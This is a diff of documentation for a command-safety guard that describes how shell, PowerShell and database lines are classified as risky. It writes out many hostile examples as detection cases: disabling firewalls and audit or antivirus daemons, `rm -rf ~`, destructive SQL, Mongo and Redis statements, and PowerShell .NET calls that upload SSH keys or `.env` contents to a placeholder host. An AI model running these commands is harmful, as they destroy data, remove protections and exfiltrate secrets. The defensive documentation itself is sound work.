@@ -300,14 +300,23 @@ both), `NAME=value` words and `!`, as it is without `coproc`: `coproc FOO=1 rm
 -rf ~`, `coproc { ! rm -rf ~; }` and `coproc NAME { FOO=1 rm -rf ~; }` judge
 the `rm`. A redirect in front of the command gives the command its words
 back, as any redirect does (see [Splitting](#splitting)): `coproc { 2>/dev/null
-rm -rf ~; }` and `coproc > out rm -rf ~` are `Delete`. The grammar has no
-`coproc`, so two forms are not read, and are risky:
+rm -rf ~; }` and `coproc > out rm -rf ~` are `Delete`. The grammar reads the
+`}` that closes such a group as a command of its own; the shell runs nothing
+for it, so the walk takes off one bare `}` with no arguments for each `{` a
+`coproc` opened in the same script, and it is no unit: `coproc { ls *.txt; }`
+and `coproc NAME { ls; }` only read, as `coproc cat` does, and a quoted `'}'`
+is still a program. A group whose commands start on the next line (`coproc
+NAME {`, a newline, `ls`) leaves the `coproc` with nothing to run on its own
+line: it is no unit either, and the lines after it are read as they stand. The
+grammar has no `coproc`, so three forms are not read, and are risky:
 
 - A loop, conditional, `case` or function after it, or inside its group
   (`coproc while …; do …; done`, `coproc NAME { for …; do …; done; }`), is cut
   into pieces whose body hides behind the program `do`: `Unreadable`.
 - A `{` stuck to a word (`coproc {rm -rf ~;}`): zsh runs it as a group, the
   grammar reads `{rm` as a program of that name: `Unreadable`.
+- A group that never closes in its script (`coproc {`, `coproc { ls }`, `coproc
+  { ls; '}'`), which bash does not run as written: `Unreadable`.
 
 The other words that start a command of their own are read the same way,
 since the grammar does not read a group or a negation after them either.
@@ -1572,7 +1581,11 @@ moved no line between safe and risky. Each item below says which rule it is:
   `com.apple.cfprefsd.xpc.daemon`) are `stop_system`, while a `launchctl
   kill` or `stop` whose target is only known when it runs is `stop_unknown`;
   the target of any other label (`gui/501/com.me.worker`) is the user's own.
-  `systemctl restart` is not a stop and stays safe.
+  `systemctl restart` is not a stop and stays safe. A name or pattern
+  that matches the process of a daemon that protects the machine
+  (`killall auditd`, `pkill firewalld`), and a `launchctl kill` or `stop`
+  of such a daemon's label (`com.apple.alf`), is `system_settings` (see
+  [Machine settings on macOS and Linux](#machine-settings-on-macos-and-linux)).
 - **A name only known when it runs (`stop_unknown`).** `killall $NAME`,
   `pkill "$PATTERN"`, `xargs pkill`.
 - **A listing into `Stop-Process`.** `Stop-Process` is read by its own
@@ -2055,7 +2068,28 @@ of their strictest, so each family below was added on that test.
   are not read as `--user` or `--system` either: one walk of the arguments
   skips the values and finds those two (`systemctl -p --user disable x` is
   a system-wide disable). `timedatectl -p NTP set-ntp false` skips its
-  `-p`/`--property` value the same way.
+  `-p`/`--property` value the same way. The other init systems are read the
+  same way: `rc-update del` (or `delete`, or a verb only known when it runs),
+  `update-rc.d name disable` or `remove`, and `chkconfig name off` or
+  `chkconfig --del name` (`-d` on SUSE, with `--level` skipped) take a service out of what
+  starts at boot, as `systemctl disable` does, whatever the service;
+  `rc-update add`, `update-rc.d name defaults` or `enable` and `chkconfig
+  name on` are safe. Some `systemctl` verbs change many units at once:
+  `isolate` starts a target and stops every unit it does not want, so it is
+  risky whatever the target (and also `stop_system` for `poweroff`,
+  `reboot`, `halt`, `kexec`, `soft-reboot`, `rescue`, `emergency`,
+  `shutdown`, `exit`, `final` and the runlevels that are their aliases,
+  `runlevel0`, `runlevel1` and `runlevel6`, as `systemctl poweroff` and
+  `rescue` are), and without a target it is an error and safe;
+  `set-default` to a target other than `graphical`, `multi-user` or the
+  runlevels that alias them (`runlevel2` to `runlevel5`), with or without
+  `.target`, or to one only known when it runs, changes what the computer boots into;
+  `preset-all` enables and disables units by the preset files. `edit`,
+  `revert` and `preset` of a unit that protects the machine (below), a
+  pattern or a unit only known when it runs change how that protection
+  runs; of any other unit (`systemctl edit nginx`) they are safe, as is
+  `get-default`. These follow `--user` as `disable` does: `systemctl --user
+  isolate x.target` changes only the user's own session and is safe.
 - **Stopping a service.** `systemctl stop`, `systemctl kill` and `service …
   stop` are safe, because `stop docker` is a common development step, and
   `stop` is not a change to what the system runs at boot; `launchctl stop` and `start`,
@@ -2064,18 +2098,80 @@ of their strictest, so each family below was added on that test.
   `launchctl kill TERM system/com.apple.WindowServer`), which is `stop_system`
   as stopping the process is (see
   [Stopping processes by name](#stopping-processes-by-name)). The other is a unit
-  that protects the machine (`firewalld`, `ufw`, `nftables`, `iptables`,
-  `ip6tables`, `apparmor`, `auditd`, `fail2ban`), whose stopping is the same
+  that protects the machine (the firewalls, `apparmor`, `auditd`,
+  `fail2ban` and the antivirus and endpoint daemons listed below), whose
+  stopping is the same
   as turning that protection off, so it is risky. `systemctl kill` sends
   SIGTERM by default, which ends the daemon as `stop` does (and `auditd`
   refuses `stop`, so `kill` is how it is stopped), so it is read through the
   same rule: `systemctl kill firewalld`, `kill -s KILL auditd` and `kill
   'fire*'` are risky, `kill docker` is safe. `systemctl` matches a
   unit name holding `*`, `?` or `[` against the loaded units, so a pattern
-  (`systemctl stop 'firewall*'`) is risky too. For `service name action`, an
+  (`systemctl stop 'firewall*'`) is risky too, and so is one given to any
+  other service manager (`sv down /etc/service/*`, `cd /etc/service && sv
+  down *`), which the shell expands against the files. For `service name action`, an
   action only known when it runs may be `stop`, so it is risky when the name
   protects the machine or is only known when it runs (`service ufw
   $action`); `service nginx $action` is safe, as `service nginx stop` is.
+  An action stops the service when it is `stop`, a BSD spelling of it
+  (`onestop`, `forcestop`, `faststop`, `quietstop`), `force-stop`, `kill`,
+  or one of the actions the firewall and `AppArmor` scripts take their
+  protection down with, `flush` (`service netfilter-persistent flush`) and
+  `teardown` (`service apparmor teardown`). Every other service manager
+  is read as `service`: a program run from an init script folder
+  (`/etc/init.d`, `/etc/rc.d/init.d`, `/etc/rc.d`, `/usr/local/etc/rc.d`),
+  placed where it lands so that `cd /etc/init.d && ./ufw stop` is the same
+  as `/etc/init.d/ufw stop`, is the service of its name with its first
+  operand as the action. So is the script a shell runs (`sh
+  /etc/init.d/ufw stop`, `bash -x …`, and `cd /etc/init.d && sh ufw stop`,
+  since a shell reads a script named without a folder from the working
+  folder) or the line sources (`. /etc/init.d/ufw stop`, `source …`), the
+  operands after it being the script's; a shell given `-c` runs a line,
+  which is read as one. `invoke-rc.d name action` and `rc-service name
+  action` (whose `-e` and `-r` take a name) read the same, except that
+  `invoke-rc.d --query` only asks whether the action would be allowed and
+  `rc-service -U` (`--user`) runs the user's own services, as `systemctl
+  --user` does; runit's `sv
+  command service...` stops each service when the command is `stop`,
+  `shutdown`, `force-stop`, `force-shutdown`, or starts with the letters
+  `sv` reads as down, exit or pause (`d`, `D`, `x`, `X`, `e`, `E`, `p`), or
+  is only known when it runs, and a service given as a folder
+  (`/etc/service/ufw`) is the last part. `/etc/init.d/nginx restart`,
+  `rc-service docker stop` and `sv down nginx` are safe; `/etc/init.d/ssh
+  stop` and `sv down sshd` are `stop_system`. The protecting units are the
+  firewalls (`firewalld`, `ufw`, `nftables`, `iptables`, `ip6tables`,
+  `netfilter-persistent`, and the BSDs' `pf` and `ipfw`), `apparmor`,
+  `auditd`, `fail2ban`, and the common antivirus and endpoint daemons
+  (`clamav-daemon`, `clamav-freshclam`, `clamav-clamd`, `clamd`,
+  `freshclam`, `mdatp`, `falcon-sensor`, `sentinelone`, `osqueryd`,
+  `wazuh-agent`, `ossec`); a unit is compared without `.service` and
+  without its instance (`clamd@scan`). Stopping the daemon's process is the
+  same: `killall` and `pkill` of a name that is, or a pattern that matches,
+  `auditd`, `firewalld`, `clamd`, `freshclam`, `mdatp`, `wdavdaemon`,
+  `falcon-sensor`, `falcond`, `osqueryd`, `wazuh-agentd`, `sentineld`,
+  `ossec-agentd`, or on a Mac `socketfilterfw`, `syspolicyd`, `XProtect`,
+  `XprotectService`, `endpointsecurityd`, `com.crowdstrike.falcon.Agent`
+  and Little Snitch's daemon and network extension, is `system_settings`
+  (`pkill firewalld`, `killall auditd`, `pkill audit`, and `pkill agent`,
+  which matches `wazuh-agentd`). `pkill -f` also searches the command
+  lines these daemons usually run with (`/usr/sbin/firewalld --nofork
+  --nopid`), so a pattern that runs past a name into its arguments
+  (`pkill -f 'auditd '`) is risky too. `ufw` and `apparmor` are left out,
+  since neither runs as a process (`ufw` loads the rules and exits,
+  AppArmor lives in the kernel), and so is `fail2ban-server`: `pkill`
+  searches each name for its pattern, and `pkill app` and `pkill server`
+  are everyday work. Each pattern is read once for the processes the
+  system needs and the ones that protect it, as a line may give thousands.
+  `launchctl kill` and `stop` of a daemon that protects a Mac are a
+  bootout of it: a label that is, or starts with and a dot, `com.apple.alf`
+  (the application firewall), `com.apple.auditd`, `com.apple.syspolicyd`
+  (Gatekeeper), `com.apple.xprotect`, `com.apple.xprotectframework`,
+  `com.apple.endpointsecurity`,
+  `com.crowdstrike`, `com.microsoft.wdav`, `com.sentinelone` or
+  `at.obdev.littlesnitchd`, without case (`launchctl kill 9
+  system/com.apple.alf`, `launchctl stop com.apple.XProtect.daemon.scan`).
+  A `kill` whose ids come from a substitution (`kill $(pidof auditd)`) is
+  `stop_unknown`, as every such `kill` is.
 - **Backups.** `tmutil delete`, `deletelocalsnapshots`, `deleteinprogress`,
   `thinlocalsnapshots`, `disable`, `disablelocal` and `removedestination`;
   `listbackups`, `status`, `startbackup` and `enable` are safe.
@@ -2098,8 +2194,11 @@ of their strictest, so each family below was added on that test.
   persistent-apps`), a path in the workspace or the user's own folder,
   `defaults read`, `pmset -g` and the `-get`/`-list` options are safe.
 
-`hostname` and `service` are read in POSIX shells only: in PowerShell and cmd
-they are Windows programs and are left alone.
+`hostname`, `service` and `sv` are read in POSIX shells only: in PowerShell
+and cmd they are Windows programs or aliases (`sv` is PowerShell's
+`Set-Variable`) and are left alone. An init script is read in PowerShell too
+(`& '/etc/init.d/ufw' stop`, `Start-Process /etc/init.d/ufw stop`), since pwsh
+on Linux runs a path under `/etc/init.d` as the script it is; cmd never does.
 
 An argument of any of these programs that may split into words when it runs
 may be the option that changes a setting, so a line in which the program's
@@ -2836,7 +2935,10 @@ keys in it`. Another folder that holds a key without being one (`~/.config`,
   "$X/.ssh/id_rsa"`, `cat ~/${NAME}`, `Get-Content
   (Join-Path …)`, a PowerShell string with a variable the guard cannot name, a
   path in a variable the line sets (`k=~/.ssh/id_rsa; cat $k`), and a
-  .NET call (`[IO.File]::ReadAllText(…)`). The guard does not guess a value,
+  .NET read given such a path (`[IO.File]::ReadAllText($p)`). A .NET read of
+  a path written out (`[IO.File]::ReadAllText("$HOME\.ssh\id_rsa")`,
+  `ReadAllLines`, `ReadAllBytes`, `ReadLines`, `OpenRead`, `OpenText`) is read
+  as a `Get-Content` of it. The guard does not guess a value,
   and `classify` flags nothing for it. `effect` already says `Unknown` for each
   (a path known only when it runs is not reads-only), so a caller that only lets
   a line run unasked when it is `ReadsOnly` asks. A reader whose file is known
@@ -3243,9 +3345,15 @@ file that is not one is safe (`scp build/pkg.tar host:/srv/`,
   directory, so a name that core marks as a secret there is one:
   `curl -T "$x/.ssh/id_rsa"` sends `~/.ssh/id_rsa`.
 - The whole environment: `env`, `printenv`, `set`, `export -p`, `declare -x`,
-  `/proc/self/environ`, PowerShell's `Get-ChildItem env:` (`gci`, `dir`).
-  One variable (`printenv HOME`, `Get-ChildItem env:PATH`) is not. cmd's bare
-  `set` is not read by its grammar and comes back `unreadable`.
+  `/proc/self/environ`, PowerShell's `Get-ChildItem env:` (`gci`, `dir`), a
+  wildcard there that may match many (`Get-ChildItem env:AWS*`), listed or
+  printed (`Get-Item`, `Get-Content env:*`, `gc env:AWS*`), and .NET's
+  `[Environment]::GetEnvironmentVariables()`, or `GetEnvironmentVariable`
+  given a name only known when it runs. One variable (`printenv HOME`,
+  `Get-ChildItem env:PATH`, `gc env:PATH`,
+  `[Environment]::GetEnvironmentVariable('PATH')`)
+  is not. cmd's bare `set` is not read by its grammar and comes back
+  `unreadable`.
 - The GPG secret keys `gpg --export-secret-keys` and `--export-secret-subkeys`
   print, which no path names.
 - A file the line writes from a secret, for the rest of the line: a copy
@@ -3295,7 +3403,15 @@ dist .` packs `dist`.
   `http`, `https` and `xh` with `field@f`, `field=@f` or `@f`, and
   `Invoke-WebRequest` and `Invoke-RestMethod -InFile f`, `Send-MailMessage
   -Attachments f` (a list), and `Start-BitsTransfer -Source f` when
-  `-TransferType` is `Upload`. Senders that name the file in their own
+  `-TransferType` is `Upload`. Without `-Source`, any word that is not a
+  parameter or the value of one may be its source given by position. Only
+  the parameters known to take a value (`-Destination`, `-Priority`,
+  `-DisplayName` and its others, and the common ones, by name or by an
+  abbreviation no switch also begins with) take the next word; after a switch
+  (`-Asynchronous`, `-Dynamic`, `-CustomHeadersWriteOnly`) or a parameter
+  the guard does not know, the next word is a source, so in
+  `Start-BitsTransfer -Dynamic .env https://x/u -TransferType Upload` the
+  source is `.env`. Senders that name the file in their own
   syntax: `socat`'s `FILE:`, `OPEN:`, `GOPEN:` and `READFILE:` addresses
   (when another of its addresses is a network one: `TCP:`, `UDP:`,
   `OPENSSL:`, `SOCKS:` and the like), the attachments of `mail`, `mailx`,
@@ -3309,6 +3425,27 @@ dist .` packs `dist`.
   (`-b <(echo …)`, `< <(echo …)`), unless `-b` names a file other than its
   input (`-`, `/dev/stdin`), which is not read. A `put -r` of the workspace
   sends it.
+- **A .NET upload**, judged as the `Invoke-RestMethod` that posts the same:
+  `Net.WebClient`'s `UploadFile` (each argument is a file it may upload),
+  and `UploadData`, `UploadString` and `UploadValues`, `HttpClient`'s
+  `PostAsync`, `PutAsync`, `PatchAsync` and `SendAsync`, and a socket's or a
+  mail client's `Send` (each argument is a body), the `Async` and `TaskAsync`
+  forms too. They are named by the method alone, since the object they are
+  called on is often a variable: `(New-Object Net.WebClient).UploadFile(url,
+  "$HOME\.ssh\id_rsa")` sends a key. A `Write` (`WriteAsync`, `WriteByte`,
+  `WriteLine`) sends what it is given when it is called on a network stream:
+  one opened in its object (`$tcp.GetStream().Write($k, …)`), or a variable
+  set from a value that opens one (`$s = $tcp.GetStream()`, an `SslStream`
+  around it). A request carries its address, which can hold a secret, so it
+  is judged as the `Invoke-WebRequest` of its arguments: `Net.WebClient`'s
+  `DownloadString`, `DownloadData`, `DownloadFile`, `OpenRead` and
+  `OpenWrite`, `HttpClient`'s `GetAsync`, `GetStringAsync`,
+  `GetByteArrayAsync`, `GetStreamAsync`, `GetFromJsonAsync` and `DeleteAsync`
+  (with their other async forms), and `[Net.WebRequest]::Create` (`Create`,
+  `CreateHttp`, `CreateDefault` on a `WebRequest` type): `$b = gc .env;
+  (New-Object Net.WebClient).DownloadString("https://x/$b")` sends it. What
+  the call's object and arguments run is handed to it, as for a command's
+  substitution (`$wc.UploadString(url, (Get-Content .env -Raw))`).
 - **A copy to another machine**: `scp`, `rsync`, `sftp` and `rclone copy` to
   a `host:path` (or `rsync://`, `::module`) destination, and `aws s3`,
   `gsutil` and `gcloud storage` (`cp`, `mv`, `rsync`) to a `s3://` or `gs://`
@@ -3330,7 +3467,15 @@ dist .` packs `dist`.
   a colon. The key a program logs in with (`ssh -i`, `scp -i`, `-o
   IdentityFile=`, `curl --key`) is not sent.
 - **A pipeline.** A stage reads a secret (any program given one's path, the
-  environment, or a file redirected onto it) and a later stage sends its input:
+  environment, or a file redirected onto it; a .NET read of a file is the
+  `Get-Content` of it, `[IO.File]::ReadAllText`, `ReadAllLines`,
+  `ReadAllBytes`, `ReadLines`, `OpenRead`, `OpenText` and their `Async` forms,
+  named by the method whatever it is called on, so
+  `[IO.File]::ReadAllText('.env') | irm …` sends `.env`; so is a reader or
+  stream its constructor opens on a file, `[IO.StreamReader]::new(f)`,
+  `[IO.FileStream]::new(f, …)` and `[IO.FileInfo]::new(f)`, and the file
+  `switch -File f` walks) and a later stage
+  sends its input:
   `nc` (`nc.openbsd`, `nc.traditional`), `ncat`, `socat`, `telnet`, `ssh`,
   `mail`, `s-nail`, `gh gist create`, `Invoke-RestMethod`,
   `Send-MailMessage` (which attaches what it is piped), `curl`
@@ -3382,7 +3527,27 @@ dist .` packs `dist`.
   expands one after it (`source .env; nc host 1 <<< "$TOKEN"`). So does
   `export`, `declare`, `typeset`, `local` or `readonly` given a substitution
   that reads a secret as its words (`export $(cat .env | xargs)`), which sets
-  whatever names it prints; `export k=$(cat .env)` sets `k` alone.
+  whatever names it prints; `export k=$(cat .env)` sets `k` alone. In
+  PowerShell a variable assigned from a read (`$b = Get-Content .env -Raw`,
+  `$b = [IO.File]::ReadAllText(…)`) holds it, and so does one assigned from
+  that (`$j = "x$b"`, each variable of a chain `$a = $b = …`), the variable
+  of a `foreach` over it (`foreach ($l in Get-Content .env) { iwr
+  "https://x/$l" }`), and `$_` and `$PSItem` in a `switch` over it (`switch
+  (gc .env) { default { iwr "https://x/$_" } }`, `switch -File .env { … }`).
+  So does a variable `Set-Variable` (`sv`, `set`) or `New-Variable` (`nv`)
+  sets from it, by `-Name` or by position, from its value or from what it is
+  piped (`Set-Variable b (gc .env)`, `gc .env | sv b`), and one a cmdlet's
+  `-OutVariable` (`-ov`, `-ov +b`) or `-PipelineVariable` (`-pv`) sets from
+  what it prints (`gc .env -OutVariable b`). The variables a command reads
+  are taken from the grammar's variable nodes in its arguments, not from
+  their text: `$b`, `"x$b"`, `$script:b` and a splat (`irm @p`, where `$p =
+  @{Body = $b; …}`). Its names are read as PowerShell reads them, in any case
+  and without a scope (`$B`, `$script:b`), and a variable piped on is a stage
+  that reads what it holds (`$b | irm …`). `Get-Variable` prints what the
+  variables it names hold (`(Get-Variable b).Value | irm …`, `Get-Variable b
+  -ValueOnly | irm …`), and every variable the line has set before it when it
+  names none, a wildcard or a name only known when it runs. An assignment to a member or an element
+  (`$r.Content = …`, `$a[0] = …`) holds it in the whole variable.
 
 A script a shell starts, a `find -exec` and a substitution take the place in a
 pipeline of the command they run for. A function or an alias the line
@@ -3409,12 +3574,16 @@ the first to the end of the second, which also holds whatever the line runs
 between them, so a call of the name may be judged with more than it runs and
 flagged for it.
 
-Not read, so the caller has to account for them: a secret read into a PowerShell
-variable (`$k = Get-Content …`); a path known only when it runs (`curl -d
-@$F`); a connection opened with `exec 3<>/dev/tcp/…`; an `sftp -b` batch file;
-`git push` of a committed `.env`; secrets outside core's table and the names
-above (`/etc/shadow`, a key with an unusual name); and a `find -exec` whose
-filter picks secrets by a name the guard does not know (`-name '*.pem'`).
+Not read, so the caller has to account for them: a PowerShell variable set
+by a name only known when it runs (`Set-Variable $n …`), or set or read
+through the `variable:` drive (`Get-Content variable:k`) or
+`$ExecutionContext.SessionState.PSVariable`; a `Write` on a network stream
+held in a variable set some other way than from a value that opens it; a
+path known only when it runs (`curl -d @$F`); a connection opened with `exec
+3<>/dev/tcp/…`; an `sftp -b` batch file; `git push` of a committed `.env`;
+secrets outside core's table and the names above (`/etc/shadow`, a key with
+an unusual name); and a `find -exec` whose filter picks secrets by a name the
+guard does not know (`-name '*.pem'`).
 
 ## Data in a database
 
@@ -3602,9 +3771,10 @@ up.
 | `sqlite3` | the operands after the file, `-cmd` |
 | `duckdb` | the operands after the file, `-c`, `-s`, `-cmd` |
 | `mongosh`, `mongo` | `--eval` |
-| `redis-cli` | the command and its arguments |
-| `clickhouse-client`, `clickhouse client` | `-q`, `--query` |
+| `redis-cli`, `valkey-cli`, `keydb-cli` | the command and its arguments |
+| `clickhouse-client`, `clickhouse client` | `-q`, `--query`, and every operand (also after `-n`, `--multiquery`) |
 | `sqlcmd` | `-Q`, `-q` (`/Q` too on Windows) |
+| `Invoke-Sqlcmd` (PowerShell) | `-Query`, and every argument no parameter takes |
 | `cqlsh` | `-e`, `--execute` |
 
 Short options bundle (`psql -Atc`), a value may be attached (`-cSQL`,
@@ -3619,6 +3789,29 @@ yargs does) a word that starts with `-` is never the value of any option, and
 --eval 'db.dropDatabase()'` and `clickhouse-client --password --query 'DROP
 TABLE t'` read the statement option after the password. A statement option
 followed by such a word reads the word as the statement too.
+A client that takes statements as operands (`clickhouse-client 'DROP TABLE
+t'`, and `-n 'DROP TABLE t'`, since `-n` takes no value) reads every word that
+is no option and no option's value as one, and an optional value as an operand
+too: `clickhouse-client --password 'DROP TABLE t'` runs the `DROP`.
+
+`Invoke-Sqlcmd` reads its parameters as PowerShell does: any start of a name
+or alias in any case (`-que`), `-Query:'…'`, and the query as its first
+positional parameter (`Invoke-Sqlcmd 'DROP TABLE t'`). A start of several
+names is refused by PowerShell and one of no name takes no value, so the word
+after either is read as a query too; `-InputFile` is a file of statements,
+which runs what the line does not show, as `psql -f` does (`-InputFile nul`
+runs nothing). In PowerShell a parameter word with quotes in
+it (`mysql --execute='DROP TABLE t'`, `psql --command="DROP TABLE t"`) is the
+word with its quotes taken off, as PowerShell hands it to a native program. A
+variable or `$(…)` in it, in a double-quoted part or outside quotes
+(`--command="DROP TABLE $t"`, `--command=$q`), is an expansion, read as a
+POSIX shell's in a statement (below); the grammar ends `--execute=$(…)` and
+`--execute=${q}` at the `$`, and the two parts are read as one word. Every
+argument of a client is read so before its options are, so an option and its
+value in one double-quoted word (`mysql "--execute=DROP TABLE $t"`, `psql
+"-c$q"`) is read as the option it is. A quoted option word the guard cannot
+read (one that holds a `$` or backtick as text) is a statement only known
+when it runs, never left out.
 
 **What destroys.**
 
@@ -3669,17 +3862,60 @@ followed by such a word reads the word as the statement too.
   shortest start no other command has (`.bac`, `.sa`; `.ba` and `.b` are
   not them, and `.bail` is another command). `VACUUM INTO` and `.clone`
   refuse a file that exists and are safe.
-- **Redis.** `FLUSHALL`, `FLUSHDB`, an `EVAL` whose script calls one or calls
+- **Replacing a table.** `CREATE OR REPLACE TABLE` (with `TEMPORARY` or the
+  like between) and ClickHouse's `REPLACE TABLE` drop the table's rows;
+  `REPLACE INTO` adds rows, `CREATE OR REPLACE VIEW` and `FUNCTION` hold no
+  data, and `replace(…)` is a function. `RESTORE DATABASE` and `RESTORE LOG`
+  with a `FROM` write the backup over the database they name (`WITH REPLACE`
+  over any one); without one (`RESTORE DATABASE x WITH RECOVERY`) they read no
+  backup, and `RESTORE HEADERONLY`, `FILELISTONLY` and `VERIFYONLY` read the
+  backup.
+- **SQL run elsewhere.** PostgreSQL's `dblink_exec`, `dblink` and
+  `dblink_send_query` run the SQL they are given in a database they connect
+  to, named plainly or quoted (`"dblink_exec"(…)`): the string after the
+  connection (or the one string) is read as SQL, and an argument that is not a
+  literal or `true`/`false` is `unknown`. The body of a function or procedure
+  (`CREATE [OR REPLACE] FUNCTION … AS $$ … $$`, or a string after `AS`, also
+  with an `E` or `U&` before it) is read as the statements it holds, as a `DO`
+  body is: what calls it (a `SELECT f()`, a trigger) need not be on the line.
+  A `U&'…'` body that spells a character by its code (`\0065`), or names its
+  own escape, is `unknown`.
+- **Redis.** `FLUSHALL`, `FLUSHDB`, `FUNCTION FLUSH` (every function of the
+  server), `SHUTDOWN NOSAVE` (what the server holds and has not saved), an
+  `EVAL` whose script calls one or calls
   `DEL` or `UNLINK` and also `KEYS` or `SCAN` (the commands are the strings it
   calls, so `KEYS[1]`, the keys it is given, is not a listing), and a
   `DEL` or `UNLINK` of keys the line lists: `redis-cli --scan … | xargs
   redis-cli del`, `redis-cli del $(redis-cli keys 'x*')`. `redis-cli del k`
   deletes one key and is safe. `redis-cli --cluster call HOST:PORT COMMAND…`
   runs the command on every node, and is read as the command.
-- **MongoDB.** `dropDatabase`, `dropCollection`, `drop` (as a call or a
-  command key), `deleteMany` and `remove` with no filter or `{}`.
-- **The tools.** `dropdb`, `dropuser`, `mysqladmin drop` and `mariadb-admin
-  drop`, MariaDB's name for it. `mysqladmin` runs a
+- **MongoDB.** `dropDatabase`, `dropCollection`, `drop`, `dropAllUsers` and
+  `dropAllRoles` (as a call, `db.dropAllUsers()` or `db["dropAllUsers"]()`, or
+  a command key, quoted or not), and the `dropAllUsersFromDatabase` and
+  `dropAllRolesFromDatabase` commands; `deleteMany` and `remove` with a filter
+  that picks every document there may be: none, `{}`, one with a spread from a
+  value (`{...f}`, `{a: 1, ...f}`, since `f` may hold any field) or one only
+  known when it runs (`deleteMany(f)`), while an object written out with a
+  field in it (`{a: 1}`) picks. An operation in a list, as `bulkWrite` takes
+  them, that is a `deleteMany` (`{deleteMany: {filter: {}}}`, and the
+  client's `bulkWrite` of mongosh 2.3, `{namespace: "app.users", name:
+  "deleteMany", filter: {}}`) is read by its `filter`. The `delete` command
+  (`runCommand({delete: "users", deletes: [{q: {}, limit: 0}]})`) is read by
+  each of its `deletes`: a `q` that picks every document, without a `limit` of
+  1, deletes them, and deletes not written out may. A key is read as
+  JavaScript takes it: of two keys of one name the last counts, and a spread
+  (`...o`) may set any key or replace one before it, so an object with one is
+  not known to pick or to have a `limit` of 1. `delete` is the command when
+  its object is what `runCommand` or `adminCommand` is given, or is its first
+  key with a name for its value in an object no other call is given; a field
+  named `delete` or `deleteMany` (`find({delete: false})`, `insertOne({deleteMany:
+  1})`) is no command. `deleteOne` deletes one document, as `redis-cli del k`
+  deletes one key, and is safe.
+- **The tools.** `dropdb`, `dropuser`, `pg_dropcluster` (a whole cluster, its
+  data folder with it), `heroku pg:reset` and `supabase db reset` (which
+  empty a hosted or local database and run its migrations again),
+  `mysqladmin drop` and `mariadb-admin drop`, MariaDB's name for it. A line
+  that asks for the help (`--help`, `-h`) runs nothing. `mysqladmin` runs a
   command from any unique start of its name (`mysqladmin proc stat` works),
   so a command word of two letters or more that starts `drop`, in any case,
   is `drop`: `dro`, `dr`.
@@ -3761,12 +3997,18 @@ with an escaped `$` or backtick in it (`psql <<< "SELECT \$( ; DROP TABLE t;
 unquoted here-document with both is: the shell passes the escaped text to the
 client as it is, and the reader would take `\$(`, `\${` and a pair of
 backticks for one expansion that hides the text between them; this covers
-`echo`, `printf` and `Write-Output` too. On PowerShell and
-cmd that is not so: an expansion in a double-quoted word (`$id`, `$(…)`,
-`%id%`) is not read as a word, so any statement with one is `unknown`
-(`psql -c "DELETE FROM t WHERE id = $id"`), even one that would destroy
-(`psql -c "DROP TABLE t; $x"` is `unknown`, not `drop_data`); a single-quoted
-PowerShell word has none. A client command that runs a
+`echo`, `printf` and `Write-Output` too. A PowerShell double-quoted string or
+here-string given to a client as its statement is read the same way, from the
+grammar's reading of it: each variable and `$(…)` in it stands as an expansion,
+so `psql -c "DELETE FROM t WHERE id = $id"` is safe, `psql -c "DROP TABLE
+$t"` is `drop_data` and `psql -c "$verb FROM t"` is `unknown`; a `$(…)` runs
+a command, which prints what it likes, so a statement with one is `unknown`,
+as a POSIX command substitution is. A string that
+holds a `$` or a backtick as text (`` `$ ``, a lone `$`) is `unknown`, since
+the reader would take it for an expansion that hides what follows. On cmd an
+expansion in a double-quoted word (`%id%`) is not read as a word, so any
+statement with one is `unknown` (`psql -c "DROP TABLE t; %x%"` is `unknown`,
+not `drop_data`); a single-quoted PowerShell word has none. A client command that runs a
 program is `unknown` too: `\!` in `psql` and `mysql`, `COPY … PROGRAM`,
 `.shell`, `.system` and `.read |cmd` in `sqlite3` and `duckdb`, `xp_cmdshell`,
 and `system` in `mysql` (it is no command of another client: ClickHouse's
@@ -3820,7 +4062,7 @@ db:migrate`) are safe: the guard reads no program that is not on its list.
 Not read, so the caller has to account for them: a client started by `docker
 run`, `docker compose run`, `kubectl run`, `kubectl debug` or `oc rsh`; what a file of statements holds, even
 one the line writes; stored procedures (`CALL p()`, `EXEC p`),
-whatever they run; the
+whatever they run (a body written on the line is read); the
 text of a prepared statement that is not on the line (`EXECUTE s` after a
 `PREPARE` in an earlier call; one in the same text is read); a `WHERE`
 that is true for every row in a way other than `1`, `TRUE` and `1 = 1`;
@@ -4001,6 +4243,34 @@ one given counting, and `unknown` with a method only known when it runs),
 Midnight Commander), each safe with `--dry-run` (and rclone's and s3cmd's
 `-n`), the last one given counting.
 
+**The clouds' PowerShell modules.** In PowerShell, a `Remove-` cmdlet whose
+noun starts with a cloud module's prefix deletes in that cloud: `Az` (with
+`AzureRM`, `Azure` and `AzureAD`) for Azure; every service prefix of the AWS
+Tools (`EC2`, `S3`, `RDS`, `IAM`, `CFN`, `KS`, `QLDB`, `SC`, `CA`, `CS` and the
+rest, taken from AWS Tools 5.0.327 with the services earlier versions shipped,
+and listed in `detect/resources.rs`) for AWS; `Gc` (`Gce`, `Gcs`, `GcSql`,
+`Gcd`), `Gke` and `Bq` for Google Cloud; and `Mg` (Microsoft Graph), `Entra`
+and `Msol` for Microsoft Entra and Microsoft 365. So `Remove-AzResourceGroup
+-Name rg -Force`, `Remove-AzVM`, `Remove-EC2Instance`, `Remove-S3Bucket
+-DeleteBucketContent`, `Remove-GcsBucket`, `Remove-BqDataset` and
+`Remove-MgUser` are `destroy_resources`, whatever their parameters, as a
+pipeline's last stage (`Get-AzResourceGroup | Remove-AzResourceGroup -Force`),
+in a block (`ForEach-Object { … }`, `foreach`, `Invoke-Command`), behind a
+module's qualifier (`Az.Resources\Remove-AzResourceGroup`) and in `pwsh -c`
+from another shell. A resource group, a bucket or an account is several
+resources at once, and the line cannot tell a scratch one from one that
+matters, so no named target makes it safe. The name is read in any case, as
+PowerShell reads it, so a noun of another module that starts like a prefix is
+told apart by name (`Remove-SmbShare`, `Remove-DscConfigurationDocument`,
+`Remove-RDSessionCollection`, `Remove-OrganizationRelationship`,
+`Remove-LocalUser`, `Remove-ADComputer`, `Remove-CDDrive`,
+`Remove-RsCatalogItem`), unless a longer AWS prefix starts it too, and the
+cmdlets that only change what this machine is signed in to
+(`Remove-AzContext`, `Remove-AzAccount`, `Remove-AzureRmAccount`) stay safe,
+as do listing and creating (`Get-AzVM`, `Get-S3Bucket`, `New-AzResourceGroup`).
+`-WhatIf` does not make one safe: a quoted `'-WhatIf'` is a value, and the
+guard reads the two as the same word.
+
 A family of delete verbs read by its prefix (`delete-*` for `gcloud`, `az`
